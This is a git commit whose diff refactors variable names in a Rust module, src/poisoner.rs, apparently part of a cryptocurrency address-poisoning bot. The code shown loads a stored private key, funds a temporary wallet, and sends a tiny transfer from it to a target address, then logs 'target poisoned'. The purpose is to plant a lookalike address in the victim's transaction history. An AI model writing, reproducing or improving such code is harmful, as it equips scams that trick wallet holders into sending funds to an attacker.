e814d2096786fc3afb53cfd1557a7272f8b8ba9b
Andy Méthion <andymethion@gmail.com>
2026-03-22 20:41:45 +0100

    Refactor `poison.rs` by renaming parameters for clarity and consistency, and updating internal variable names in `poisoner` for improved readability.

--- src/poisoner.rs
+++ src/poisoner.rs
@@ -13,10 +13,10 @@ use std::ops::{Add, Mul};
 use std::str::FromStr;
 use std::sync::Arc;
 
-async fn send_transaction(http_provider: &HttpProvider, to: &Address, value: &U256) {
+async fn send_transaction(provider: &HttpProvider, to: &Address, value: &U256) {
     let transaction = TransactionRequest::default().to(*to).value(*value);
 
-    let pending = http_provider
+    let pending = provider
         .send_transaction(WithOtherFields::from(transaction))
         .await
         .unwrap();
@@ -24,10 +24,10 @@ async fn send_transaction(http_provider: &HttpProvider, to: &Address, value: &U2
     let receipt = pending.get_receipt().await.unwrap();
 }
 
-pub(crate) async fn poison(
+pub(crate) async fn poisoner(
     config: Arc<Config>,
     db: Arc<DBWithThreadMode<SingleThreaded>>,
-    http_provider: Arc<HttpProvider>,
+    provider: Arc<HttpProvider>,
     from: Address,
     to: Address,
 ) {
@@ -36,19 +36,19 @@ pub(crate) async fn poison(
     let bytes = db.get(identifier).unwrap().unwrap();
     let string = String::from_utf8(bytes).unwrap();
 
-    let temp_private_key_signer = PrivateKeySigner::from_str(&string).unwrap();
-    let temp_ethereum_wallet = EthereumWallet::from(temp_private_key_signer);
-    let temp_http_provider = get_http_provider(temp_ethereum_wallet, &config.http_url);
+    let temp_signer = PrivateKeySigner::from_str(&string).unwrap();
+    let temp_wallet = EthereumWallet::from(temp_signer);
+    let temp_provider = get_http_provider(temp_wallet, &config.http_url);
 
-    let first_to = temp_http_provider.default_signer_address();
+    let first_to = temp_provider.default_signer_address();
     let last_to = to;
 
     let value_without_fees = U256::ONE.mul(U256::from(10).pow(U256::from(10)));
     let fees = U256::from(25).mul(U256::from(10).pow(U256::from(10)));
     let value_with_fees = value_without_fees.add(fees);
 
-    send_transaction(&http_provider, &first_to, &value_with_fees).await;
-    send_transaction(&temp_http_provider, &last_to, &value_without_fees).await;
+    send_transaction(&provider, &first_to, &value_with_fees).await;
+    send_transaction(&temp_provider, &last_to, &value_without_fees).await;
 
     info!("target poisoned | address {:?}", to);
 }
